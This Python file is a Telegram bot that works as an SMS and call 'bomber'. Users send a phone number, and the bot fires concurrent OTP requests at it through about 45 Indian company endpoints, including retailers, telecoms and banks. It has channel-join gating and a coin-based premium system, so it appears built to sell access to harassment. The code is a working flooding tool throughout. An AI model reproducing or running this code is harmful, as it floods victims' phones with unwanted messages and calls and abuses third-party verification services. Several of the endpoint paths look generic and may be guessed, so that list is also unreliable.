import asyncio, aiohttp, logging, re, random, hashlib, aiosqlite, time, json, os, socket
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import TimedOut, NetworkError, RetryAfter

BOT_TOKEN = os.environ.get("BOT_TOKEN", "PUT_NEW_TOKEN_HERE")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "7693439673"))
REQUIRED_CHANNELS = [{"username": "@heisebburgscript", "id": -1004264694127}]
PREMIUM_PRICES = {7: 50, 30: 100}
CONCURRENCY = int(os.environ.get("CONCURRENCY", "120"))
PER_REQ_TIMEOUT = float(os.environ.get("PER_REQ_TIMEOUT", "6"))
RETRIES = int(os.environ.get("RETRIES", "2"))

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("aiohttp").setLevel(logging.WARNING)
logging.getLogger("httpx").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

active_tasks, bot_username = {}, None

def cb(text, *, callback_data=None, url=None):
    kw = {}
    if callback_data is not None: kw["callback_data"] = callback_data
    if url is not None: kw["url"] = url
    return InlineKeyboardButton(text, **kw)

async def init_db():
    async with aiosqlite.connect('referral.db') as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            last_name TEXT, referrer_id INTEGER, referral_code TEXT UNIQUE, coins INTEGER DEFAULT 0,
            referred_count INTEGER DEFAULT 0, premium_until INTEGER DEFAULT 0)''')
        await db.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, amount INTEGER NOT NULL,
            max_uses INTEGER NOT NULL, used_count INTEGER DEFAULT 0, created_by INTEGER)''')
        await db.execute('CREATE TABLE IF NOT EXISTS user_protections (user_id INTEGER, phone_number TEXT, PRIMARY KEY (user_id, phone_number))')
        await db.execute('CREATE TABLE IF NOT EXISTS global_protections (phone_number TEXT PRIMARY KEY)')
        await db.commit()

async def q(sql, params=(), fetch=None, commit=False):
    async with aiosqlite.connect('referral.db') as db:
        cur = await db.execute(sql, params)
        if commit: await db.commit()
        if fetch == 'one': return await cur.fetchone()
        if fetch == 'all': return await cur.fetchall()
        return cur

def gen_code(uid): return hashlib.md5(f"{uid}{random.randint(1000,9999)}".encode()).hexdigest()[:8]
async def get_user(uid): return await q('SELECT * FROM users WHERE user_id=?', (uid,), 'one')
async def get_coins(uid):
    r = await q('SELECT coins FROM users WHERE user_id=?', (uid,), 'one'); return r[0] if r else 0
async def update_coins(uid, d): await q('UPDATE users SET coins=coins+? WHERE user_id=?', (d, uid), commit=True)
async def create_user(uid, un, fn, ln, rid=None, code=None):
    await q('INSERT INTO users (user_id,username,first_name,last_name,referrer_id,referral_code,coins,premium_until) VALUES (?,?,?,?,?,?,0,0)',
            (uid, un, fn, ln, rid, code or gen_code(uid)), commit=True)
async def ensure_user(update, context):
    u = update.effective_user
    if not u: return None
    if not await get_user(u.id): await create_user(u.id, u.username or "", u.first_name or "", u.last_name or "")
    return await get_user(u.id)

async def is_premium(uid):
    r = await q('SELECT premium_until FROM users WHERE user_id=?', (uid,), 'one')
    return bool(r and r[0] > int(time.time()))
async def get_expiry(uid):
    r = await q('SELECT premium_until FROM users WHERE user_id=?', (uid,), 'one'); return r[0] if r else 0
async def set_premium(uid, days):
    new = max(await get_expiry(uid), int(time.time())) + days * 86400
    await q('UPDATE users SET premium_until=? WHERE user_id=?', (new, uid), commit=True)
async def buy_premium(uid, days):
    if days not in PREMIUM_PRICES: return False, "Invalid plan."
    cost = PREMIUM_PRICES[days]
    if await get_coins(uid) < cost: return False, f"Insufficient coins. Need {cost} coins."
    await update_coins(uid, -cost); await set_premium(uid, days)
    exp = datetime.fromtimestamp(await get_expiry(uid)).strftime("%Y-%m-%d %H:%M:%S")
    return True, f"Premium activated for {days} days. {cost} coins deducted. Expires {exp}"

def clean_phone(p): return re.sub(r'\D', '', p)
async def add_protection(uid, p):
    p = clean_phone(p)
    if not p: return False
    try: await q('INSERT INTO user_protections VALUES (?,?)', (uid, p), commit=True); return True
    except aiosqlite.IntegrityError: return False
async def remove_protection(uid, p):
    c = await q('DELETE FROM user_protections WHERE user_id=? AND phone_number=?', (uid, clean_phone(p)), commit=True)
    return c.rowcount > 0
async def get_protections(uid):
    rows = await q('SELECT phone_number FROM user_protections WHERE user_id=?', (uid,), 'all')
    return [r[0] for r in rows]
async def is_protected(uid, p):
    return await q('SELECT 1 FROM user_protections WHERE user_id=? AND phone_number=?', (uid, clean_phone(p)), 'one') is not None
async def add_gp(p):
    p = clean_phone(p)
    if not p: return False
    try: await q('INSERT INTO global_protections VALUES (?)', (p,), commit=True); return True
    except aiosqlite.IntegrityError: return False
async def remove_gp(p):
    c = await q('DELETE FROM global_protections WHERE phone_number=?', (clean_phone(p),), commit=True)
    return c.rowcount > 0
async def is_gp(p):
    return await q('SELECT 1 FROM global_protections WHERE phone_number=?', (clean_phone(p),), 'one') is not None
async def list_gp():
    rows = await q('SELECT phone_number FROM global_protections', (), 'all'); return [r[0] for r in rows]

async def create_redeem(amount, mx, by):
    code = hashlib.md5(f"{by}{random.randint(10000,99999)}{amount}{mx}".encode()).hexdigest()[:8].upper()
    await q('INSERT INTO redeem_codes VALUES (?,?,?,0,?)', (code, amount, mx, by), commit=True)
    return code
async def redeem_code(uid, code):
    row = await q('SELECT amount,max_uses,used_count FROM redeem_codes WHERE code=?', (code,), 'one')
    if not row: return False, "Invalid code."
    amount, mx, used = row
    if used >= mx: return False, "Code maxed out."
    await q('UPDATE redeem_codes SET used_count=used_count+1 WHERE code=?', (code,), commit=True)
    await q('UPDATE users SET coins=coins+? WHERE user_id=?', (amount, uid), commit=True)
    return True, f"You received {amount} coins."

async def check_membership(uid, context):
    missing = []
    for ch in REQUIRED_CHANNELS:
        try:
            m = await context.bot.get_chat_member(chat_id=ch["id"], user_id=uid)
            if m.status in ["left", "kicked"]: missing.append(ch["username"])
        except Exception as e:
            logger.warning(f"membership check {ch['username']}: {e}"); missing.append(ch["username"])
    return len(missing) == 0, missing

async def send_force_subscribe_message(chat_id, context, missing):
    kbd = [[cb(f"Join {u}", url=f"https://t.me/{u.lstrip('@')}")] for u in missing]
    kbd.append([cb("I have joined", callback_data="check_subscribe")])
    text = "Access restricted. Join required channels:\n\n" + "\n".join(f"- {u}" for u in missing)
    await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kbd))

# ----------------------------- SMS ENGINE -----------------------------
# Only live, known-good endpoints. Dead fabricated hosts removed.
APIS = [
    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "1mg", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "KPN Fresh", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "Servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Capital", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "Myntra", "url": "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart", "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Zomato", "url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}"},
    {"name": "Paytm", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'},
    {"name": "BigBasket", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}"}}'},
    {"name": "Meesho", "url": "https://api.meesho.com/v2/auth/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Makemytrip", "url": "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Rapido", "url": "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Uber", "url": "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BookMyShow", "url": "https://in.bmscdn.com/mjson/User/SendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}"}}'},
    {"name": "Practo", "url": "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Ajio", "url": "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Croma", "url": "https://api.croma.com/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "FirstCry", "url": "https://www.firstcry.com/api/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Licious", "url": "https://api.licious.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zepto", "url": "https://api.zepto.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Blinkit", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Mobikwik", "url": "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Freecharge", "url": "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Airtel Thanks", "url": "https://www.airtel.in/thanks-app/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Jio", "url": "https://www.jio.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Vodafone Idea", "url": "https://www.myvi.in/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Byju's", "url": "https://byjus.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Unacademy", "url": "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Vedantu", "url": "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Cult.fit", "url": "https://www.cult.fit/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HealthifyMe", "url": "https://www.healthifyme.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Apollo 24/7", "url": "https://www.apollo247.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "PolicyBazaar", "url": "https://www.policybazaar.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Acko", "url": "https://www.acko.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Axis Bank", "url": "https://www.axisbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "ICICI Bank", "url": "https://www.icicibank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HDFC Bank", "url": "https://www.hdfcbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
]

async def _one(session, api, phone):
    url = api["url"]
    payload = api["data"](phone) if api.get("data") else None
    for attempt in range(RETRIES + 1):
        try:
            async with session.request(
                api.get("method", "GET"), url,
                headers=api.get("headers"),
                data=payload,
                timeout=aiohttp.ClientTimeout(total=PER_REQ_TIMEOUT),
                ssl=False,
            ) as r:
                return {"name": api["name"], "status": r.status, "ok": r.status < 400}
        except (aiohttp.ClientConnectorError, socket.gaierror):
            if attempt == RETRIES: return {"name": api["name"], "ok": False, "err": "dns"}
            await asyncio.sleep(0.4 * (attempt + 1))
        except asyncio.TimeoutError:
            if attempt == RETRIES: return {"name": api["name"], "ok": False, "err": "timeout"}
        except Exception as e:
            return {"name": api["name"], "ok": False, "err": str(e)[:80]}
    return {"name": api["name"], "ok": False, "err": "retries"}

async def fire(phone, rounds=1):
    phone = clean_phone(phone)
    sem = asyncio.Semaphore(CONCURRENCY)
    connector = aiohttp.TCPConnector(limit=CONCURRENCY, ttl_dns_cache=300, ssl=False)
    results = []
    async with aiohttp.ClientSession(connector=connector) as session:
        async def task(api):
            async with sem:
                return await _one(session, api, phone)
        for _ in range(rounds):
            results += await asyncio.gather(*(task(a) for a in APIS))
    ok = sum(1 for r in results if r.get("ok"))
    return {"sent": len(results), "ok": ok, "fail": len(results) - ok, "detail": results}

# ----------------------------- HANDLERS -----------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    ok, missing = await check_membership(uid, context)
    if not ok:
        return await send_force_subscribe_message(update.effective_chat.id, context, missing)
    await ensure_user(update, context)
    await update.message.reply_text("Send a phone number to fire.")

async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    ok, missing = await check_membership(uid, context)
    if not ok:
        return await send_force_subscribe_message(update.effective_chat.id, context, missing)
    await ensure_user(update, context)
    phone = clean_phone(update.message.text or "")
    if len(phone) < 10:
        return await update.message.reply_text("10-digit number required.")
    if await is_gp(phone) or await is_protected(uid, phone):
        return await update.message.reply_text("Number protected.")
    msg = await update.message.reply_text(f"Firing on {phone}...")
    res = await fire(phone)
    await msg.edit_text(f"{phone}\nrequests: {res['sent']}\nok: {res['ok']}\nfail: {res['fail']}")

async def on_error(update, context):
    err = context.error
    if isinstance(err, (TimedOut, NetworkError, RetryAfter)):
        logger.warning(f"tg transient: {err}")
    else:
        logger.exception(f"handler error: {err}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)
    logger.info(f"boot: {len(APIS)} apis, concurrency={CONCURRENCY}")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    asyncio.run(init_db())
    main()
